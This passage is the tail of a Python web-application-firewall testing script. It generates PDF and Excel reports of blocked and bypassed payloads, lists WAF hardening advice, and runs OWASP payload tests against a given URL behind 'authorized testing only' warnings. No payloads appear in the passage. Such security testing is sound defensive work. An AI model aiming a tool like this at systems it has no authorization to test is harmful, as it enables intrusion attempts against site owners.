                ParagraphStyle("rec_title", parent=body_style, textColor=sev_color, fontSize=10)
            ))
            story.append(Paragraph(f"  <b>WAF Rule Fix:</b> {rec['waf_rec']}", body_style))
            story.append(Paragraph(f"  <b>App-Layer Fix:</b> {rec['app_rec']}", body_style))
            story.append(Spacer(1, 0.2*cm))
    else:
        story.append(Paragraph("WAF performed well. Continue monitoring and updating rule sets.", body_style))

    # General recommendations
    story.append(Spacer(1, 0.4*cm))
    story.append(Paragraph("General WAF Hardening Recommendations", h2_style))
    general_recs = [
        "Enable OWASP Core Rule Set (CRS) in blocking mode, not detection-only.",
        "Regularly update WAF rule sets (monthly or after every major CVE release).",
        "Enable rate limiting and bot protection alongside WAF rules.",
        "Implement Defense-in-Depth: WAF + input validation + output encoding + CSP headers.",
        "Log all blocked and suspicious requests; set up SIEM alerting.",
        "Conduct quarterly WAF penetration tests and rule audits.",
        "Tune anomaly scoring thresholds to reduce false positives without weakening coverage.",
        "Enable TLS 1.2+ only; disable weak cipher suites.",
    ]
    for r in general_recs:
        story.append(Paragraph(f"• {r}", body_style))

    story.append(Spacer(1, 0.5*cm))
    story.append(HRFlowable(width="100%", thickness=1, color=MIDGRAY))
    story.append(Paragraph(
        f"Report generated: {results['scan_time']} | WAF Quality Tester v1.0",
        ParagraphStyle("footer", parent=styles["Normal"], fontSize=7,
                       textColor=colors.grey, alignment=TA_CENTER)
    ))

    doc.build(story)
    print(f"\033[92m[+] PDF report saved: {output_path}\033[0m")


# ─────────────────────────────────────────────
# EXCEL REPORT GENERATOR
# ─────────────────────────────────────────────

def generate_excel_report(results, output_path):
    import openpyxl
    from openpyxl.styles import (Font, PatternFill, Alignment, Border, Side,
                                  GradientFill)
    from openpyxl.utils import get_column_letter
    from openpyxl.chart import BarChart, Reference, PieChart

    wb = openpyxl.Workbook()

    RED_FILL = PatternFill("solid", fgColor="C0392B")
    GREEN_FILL = PatternFill("solid", fgColor="27AE60")
    ORANGE_FILL = PatternFill("solid", fgColor="E67E22")
    BLUE_FILL = PatternFill("solid", fgColor="2C3E50")
    LIGHTGRAY_FILL = PatternFill("solid", fgColor="ECF0F1")
    HEADER_FILL = PatternFill("solid", fgColor="34495E")

    WHITE_FONT = Font(color="FFFFFF", bold=True)
    BOLD_FONT = Font(bold=True)
    thin = Side(style="thin", color="BDC3C7")
    THIN_BORDER = Border(left=thin, right=thin, top=thin, bottom=thin)
    CENTER = Alignment(horizontal="center", vertical="center", wrap_text=True)
    LEFT = Alignment(horizontal="left", vertical="center", wrap_text=True)

    def header_cell(ws, row, col, value):
        c = ws.cell(row=row, column=col, value=sanitize_cell(value))
        c.fill = HEADER_FILL
        c.font = WHITE_FONT
        c.alignment = CENTER
        c.border = THIN_BORDER
        return c

    def sanitize_cell(value):
        """Strip characters that openpyxl/XML cannot encode in worksheet cells."""
        import re
        if not isinstance(value, str):
            return value
        # Remove illegal XML 1.0 control characters (openpyxl uses XML internally)
        value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', value)
        # Escape angle brackets and ampersands so the cell displays as plain text
        value = value.replace('&', '&amp;').replace('<', '[').replace('>', ']')
        return value

    def data_cell(ws, row, col, value, fill=None, bold=False, align=CENTER):
        c = ws.cell(row=row, column=col, value=sanitize_cell(value))
        if fill:
            c.fill = fill
        c.font = Font(bold=bold)
        c.alignment = align
        c.border = THIN_BORDER
        return c

    # ── Sheet 1: Summary ──
    ws1 = wb.active
    ws1.title = "Summary"

    ws1.merge_cells("A1:G1")
    title_cell = ws1["A1"]
    title_cell.value = "WAF QUALITY ASSESSMENT REPORT"
    title_cell.font = Font(size=16, bold=True, color="2C3E50")
    title_cell.alignment = CENTER
    title_cell.fill = PatternFill("solid", fgColor="ECF0F1")
    ws1.row_dimensions[1].height = 35

    info = [
        ("Target URL", results["target"]),
        ("Scan Date", results["scan_time"]),
        ("WAF Type", results["waf_type"]),
        ("Total Payloads", results["summary"]["total_payloads"]),
        ("Blocked", f"{results['summary']['total_blocked']} ({results['summary']['overall_block_rate']}%)"),
        ("Bypassed", f"{results['summary']['total_bypassed']} ({results['summary']['overall_bypass_rate']}%)"),
        ("Overall Grade", results["summary"]["grade"]),
    ]
    for i, (k, v) in enumerate(info, start=2):
        ws1.cell(row=i, column=1, value=k).font = BOLD_FONT
        ws1.cell(row=i, column=1).fill = LIGHTGRAY_FILL
        ws1.cell(row=i, column=1).border = THIN_BORDER
        ws1.cell(row=i, column=1).alignment = LEFT
        c = ws1.cell(row=i, column=2, value=v)
        c.border = THIN_BORDER
        c.alignment = LEFT
        if k == "Overall Grade":
            br = results["summary"]["overall_block_rate"]
            c.font = Font(bold=True, color="27AE60" if br >= 85 else ("E67E22" if br >= 60 else "C0392B"))

    ws1.column_dimensions["A"].width = 18
    ws1.column_dimensions["B"].width = 55

    # Category summary table
    start_row = 12
    ws1.cell(row=start_row, column=1, value="CATEGORY BREAKDOWN").font = Font(size=12, bold=True, color="2C3E50")
    ws1.row_dimensions[start_row].height = 22
    start_row += 1

    headers = ["Category", "Total", "Blocked", "Bypassed", "Block Rate", "Bypass Rate", "Risk Level"]
    for ci, h in enumerate(headers, 1):
        header_cell(ws1, start_row, ci, h)
    ws1.row_dimensions[start_row].height = 18

    for ri, (cat, data) in enumerate(results["categories"].items(), start=start_row+1):
        br = data["block_rate"]
        risk = "LOW" if br >= 85 else ("MEDIUM" if br >= 60 else "HIGH")
        risk_fill = GREEN_FILL if br >= 85 else (ORANGE_FILL if br >= 60 else RED_FILL)
        row_fill = LIGHTGRAY_FILL if ri % 2 == 0 else None

        data_cell(ws1, ri, 1, cat, fill=row_fill, align=LEFT)
        data_cell(ws1, ri, 2, data["total"], fill=row_fill)
        data_cell(ws1, ri, 3, data["blocked"], fill=row_fill)
        data_cell(ws1, ri, 4, data["bypassed"], fill=row_fill)
        data_cell(ws1, ri, 5, f"{data['block_rate']}%", fill=row_fill)
        data_cell(ws1, ri, 6, f"{data['bypass_rate']}%", fill=row_fill)
        rc = data_cell(ws1, ri, 7, risk, fill=risk_fill)
        rc.font = Font(bold=True, color="FFFFFF")
        ws1.row_dimensions[ri].height = 16

    for ci, w in enumerate([35, 8, 10, 10, 12, 12, 12], 1):
        ws1.column_dimensions[get_column_letter(ci)].width = w

    # ── Sheet 2: Detailed Results ──
    ws2 = wb.create_sheet("Detailed Results")
    headers2 = ["Category", "ID", "Description", "Payload (truncated)", "HTTP Status", "Result", "Response Time (s)"]
    for ci, h in enumerate(headers2, 1):
        header_cell(ws2, 1, ci, h)

    row = 2
    for cat, data in results["categories"].items():
        for p in data["payloads"]:
            result_text = "BLOCKED" if p["blocked"] else ("BYPASSED" if p["bypassed"] else "ERROR/UNKNOWN")
            fill = GREEN_FILL if p["blocked"] else (RED_FILL if p["bypassed"] else ORANGE_FILL)

            data_cell(ws2, row, 1, cat, align=LEFT)
            data_cell(ws2, row, 2, p["id"])
            data_cell(ws2, row, 3, p["description"], align=LEFT)
            data_cell(ws2, row, 4, p["payload"][:60], align=LEFT)
            data_cell(ws2, row, 5, p.get("status_code", 0))
            rc = data_cell(ws2, row, 6, result_text, fill=fill)
            rc.font = Font(bold=True, color="FFFFFF")
            data_cell(ws2, row, 7, round(p.get("response_time", 0), 2))
            row += 1

    col_widths2 = [30, 12, 40, 55, 12, 14, 18]
    for ci, w in enumerate(col_widths2, 1):
        ws2.column_dimensions[get_column_letter(ci)].width = w

    # ── Sheet 3: Recommendations ──
    ws3 = wb.create_sheet("Recommendations")
    recs = results.get("recommendations", [])

    ws3.merge_cells("A1:E1")
    ws3["A1"].value = "WAF REMEDIATION RECOMMENDATIONS"
    ws3["A1"].font = Font(size=14, bold=True, color="2C3E50")
    ws3["A1"].alignment = CENTER

    for ci, h in enumerate(["Severity", "Category", "Bypass Rate", "WAF Rule Fix", "App-Layer Fix"], 1):
        header_cell(ws3, 2, ci, h)

    for ri, rec in enumerate(recs, start=3):
        fill = RED_FILL if rec["severity"] == "HIGH" else ORANGE_FILL
        sc = data_cell(ws3, ri, 1, rec["severity"], fill=fill)
        sc.font = Font(bold=True, color="FFFFFF")
        data_cell(ws3, ri, 2, rec["category"], align=LEFT)
        data_cell(ws3, ri, 3, f"{rec['bypass_rate']}%")
        data_cell(ws3, ri, 4, rec["waf_rec"], align=LEFT)
        data_cell(ws3, ri, 5, rec["app_rec"], align=LEFT)
        ws3.row_dimensions[ri].height = 30

    col_widths3 = [12, 30, 14, 50, 50]
    for ci, w in enumerate(col_widths3, 1):
        ws3.column_dimensions[get_column_letter(ci)].width = w

    wb.save(output_path)
    print(f"\033[92m[+] Excel report saved: {output_path}\033[0m")


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WAF Quality Tester — Authorized Security Testing Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 waf_tester.py -u https://your-site.com
  python3 waf_tester.py -u https://your-site.com --delay 1.0 --verbose
  python3 waf_tester.py -u https://your-site.com --format both

LEGAL NOTICE:
  Only use against systems you own or have explicit written permission to test.
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (must be authorized)")
    parser.add_argument("--timeout", type=float, default=8, help="Request timeout seconds (default: 8)")
    parser.add_argument("--delay", type=float, default=0.4, help="Delay between requests in seconds (default: 0.4)")
    parser.add_argument("--verbose", action="store_true", help="Show all request results")
    parser.add_argument("--format", choices=["pdf", "excel", "both", "json"], default="both",
                        help="Report format (default: both)")
    parser.add_argument("--output", default="waf_report", help="Output filename prefix (default: waf_report)")

    args = parser.parse_args()

    print("\n" + "="*65)
    print("  WAF QUALITY TESTER — AUTHORIZED PENETRATION TESTING ONLY")
    print("="*65)
    print(f"\n  Target  : {args.url}")
    print(f"  Delay   : {args.delay}s between requests")
    print(f"  Format  : {args.format}")
    print(f"  Output  : {args.output}.*\n")
    print("  ⚠  Only test systems you own or have written authorization for.\n")
    print("="*65 + "\n")

    tester = WAFTester(
        target_url=args.url,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose,
    )

    print("[1/4] Establishing baseline connection...")
    if not tester.get_baseline():
        print("\033[91m[FATAL] Cannot reach target. Aborting.\033[0m")
        sys.exit(1)

    print("\n[2/4] Detecting WAF...")
    tester.detect_waf()

    print("\n[3/4] Running OWASP payload tests...")
    tester.run_tests()

    print("\n[4/4] Generating recommendations and reports...")
    tester.get_recommendations()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"{args.output}_{ts}"

    if args.format in ("json", "both"):
        json_path = f"{base}.json"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(tester.results, f, indent=2, ensure_ascii=False)
        print(f"\033[92m[+] JSON data saved: {json_path}\033[0m")

    if args.format in ("pdf", "both"):
        generate_pdf_report(tester.results, f"{base}.pdf")

    if args.format in ("excel", "both"):
        generate_excel_report(tester.results, f"{base}.xlsx")

    print("\n" + "="*65)
    print(f"  SCAN COMPLETE")
    print(f"  Block Rate : {tester.results['summary']['overall_block_rate']}%")
    print(f"  Grade      : {tester.results['summary']['grade']}")
    print(f"  WAF Type   : {tester.results['waf_type']}")
    print("="*65 + "\n")


if __name__ == "__main__":
    main()
